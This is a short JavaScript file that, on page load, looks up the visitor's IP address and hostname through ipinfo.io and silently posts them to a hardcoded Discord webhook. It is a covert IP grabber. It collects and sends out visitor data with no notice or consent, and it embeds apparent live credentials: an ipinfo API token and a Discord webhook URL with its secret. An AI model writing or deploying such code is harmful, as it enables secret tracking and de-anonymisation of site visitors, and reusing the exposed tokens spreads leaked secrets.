function getVisitorIpAndDns() {
    return fetch('https://ipinfo.io?token=b0138b9c06beb1')
        .then(response => response.json())
        .then(data => {
            const visitorInfo = {
                ip: data.ip,
                hostname: data.hostname || 'Hostname not available',
            };
            return visitorInfo;
        })
        .catch(error => {
            console.error('Error fetching IP and DNS info:', error);
            return { ip: null, hostname: null };
        });
}

function sendToDiscord(visitorInfo) {
    const webhookURL = "https://discord.com/api/webhooks/1288968762694963240/G_O4xUXDLHIcHd35TGezDOhAO9gaPPCxiZxPPOuQLyZ_JuULu3r4qYcNfBhrVUNeLSo9";

    const payload = {
        content: `New visitor IP address: ${visitorInfo.ip}, Hostname: ${visitorInfo.hostname}`,
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    })
    .then(response => {
        if (response.ok) {
            console.log('IP address and DNS info sent to Discord successfully!');
        } else {
            console.error('Failed to send IP and DNS info to Discord:', response.statusText);
        }
    })
    .catch(error => {
        console.error('Error sending IP and DNS info to Discord:', error);
    });
}

window.onload = async function() {
    const visitorInfo = await getVisitorIpAndDns();
    if (visitorInfo.ip) {
        sendToDiscord(visitorInfo);
    }
};